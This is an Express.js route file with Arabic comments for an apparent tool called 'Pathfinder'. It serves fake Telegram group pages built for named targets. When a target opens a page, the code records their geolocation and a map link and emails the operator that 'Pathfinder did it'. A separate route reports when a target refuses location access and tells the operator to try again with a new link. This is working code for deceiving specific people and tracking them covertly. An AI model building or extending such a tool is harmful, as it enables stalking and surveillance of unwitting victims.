// routes/groupRoutes.js
const express = require('express');
const router = express.Router();
const Group = require('../models/Group');
const multer = require('multer');
const Visit = require('../models/Visit');
const nodemailer = require('nodemailer');
const dotenv = require('dotenv');
dotenv.config();

// كل الراوتات المتعلقة بالمجموعات
router.post('/save-location', async (req, res) => {
  try {
    console.log();
    console.log();
    console.log(process.env.GMAIL_TARGET);

    const { latitude, longitude, groupId, position,target } = req.body;

    // إعداد transporter باستخدام Gmail + App Password
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: `${process.env.GMAIL_USER}`,
        pass: `${process.env.GMAIL_PASS}`
      }
    });

    // إعداد تفاصيل الرسالة
    let mailOptions = {
      from: 'Pathfinder <${process.env.GMAIL_USER}>',
      to: `${process.env.GMAIL_TARGET}`,
      subject: 'Congratulation Pathfinder did it',
      html: `<p>لقد قام</p><h1 style="color:red;">${target}</h1><p>بالدخول الى مجموعة التلجرام من الموقع التالي</p><a href="${position}">${position}</a>`
    };

    // إرسال البريد
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        return console.log('❌ Error:', error);
      }
      console.log('✅ Email sent:', info.response);
    });

    const visit = new Visit({
      group: groupId,
      latitude,
      longitude,
      position,
      target
    });

    await visit.save();
    res.json({ message: 'تم حفظ الموقع بنجاح' });
  } catch (err) {
    // console.log(err);
    res.status(500).json({ error: 'فشل في حفظ الموقع' });
  }
});

// كل الراوتات المتعلقة بالمجموعات
router.post('/failure-save-location', async (req, res) => {
  try {
    const { target } = req.body;
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: `${process.env.GMAIL_USER}`,
        pass: `${process.env.GMAIL_PASS}`
      }
    });
    let mailOptions = {
      from: 'Pathfinder <${process.env.GMAIL_USER}>',
      to: `${process.env.GMAIL_TARGET}`,
      subject: 'Pathfinder could not did it',
      html: `<p>لقد قام</p><h1 style="color:red;">${target}</h1><p>بالدخول الى مجموعة التلجرام لكنه لم يمنح صلاحية الوصول للموقع يرجى المحاولة مرة اخرى باستخدام رابط جديد</p>`
    };

    // إرسال البريد
    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        return console.log('❌ Error:', error);
      }
      console.log('✅ Email sent:', info.response);
    });
    res.json({ message: 'تم حفظ الموقع بنجاح' });
  } catch (err) {
    // console.log(err);
    res.status(500).json({ error: 'فشل في حفظ الموقع' });
  }
});

router.get('/:slug', async (req, res) => {
  try {
    const group = await Group.findOne({ slug: req.params.slug });
    if (!group) {
      return res.status(404).send('المجموعة غير موجودة');
    }
    res.render('get', { group });  // صفحة عرض تفاصيل المجموعة
  } catch (err) {
    // console.log(err);
    res.status(500).send('خطأ في السيرفر');
  }
});

// إعداد التخزين للصور
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'public/uploads'); // تأكد من وجود هذا المجلد
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + '-' + file.originalname);
  }
});
const upload = multer({ storage });

// حفظ بيانات المجموعة
router.post('/', upload.single('image'), async (req, res) => {
  try {
    const { name, description, link, subscribersCount, target } = req.body;
    const image = req.file ? `/uploads/${req.file.filename}` : '';

    const newGroup = new Group({
      image,
      name,
      description,
      link,
      subscribersCount,
      target
    });

    await newGroup.save();
    res.redirect('/home/S3766@'); // بعد الحفظ، يعيد التوجيه للصفحة الرئيسية
  } catch (err) {
    console.log(err);
    res.status(500).send('حدث خطأ أثناء حفظ المجموعة');
  }
});

// صفحة تعديل المجموعة (GET)
router.get('/edit/:id', async (req, res) => {
  try {
    const group = await Group.findById(req.params.id);
    if (!group) {
      return res.status(404).send('المجموعة غير موجودة');
    }
    res.render('editGroup', { group });
  } catch (err) {
    console.log(err);
    res.status(500).send('خطأ في السيرفر');
  }
});

// استقبال تعديل المجموعة (POST)
router.post('/edit/:id', async (req, res) => {
  try {
    const { name, description, link, image } = req.body;
    await Group.findByIdAndUpdate(req.params.id, { name, description, link, image });
    res.redirect('/home/S3766@');
  } catch (err) {
    // console.log(err);
    res.status(500).send('خطأ في التعديل');
  }
});

// حذف المجموعة (POST)
router.post('/delete/:id', async (req, res) => {
  try {
    await Group.findByIdAndDelete(req.params.id);
    res.redirect('/home/S3766@');
  } catch (err) {
    // console.log(err);
    res.status(500).send('خطأ في الحذف');
  }
});

module.exports = router;
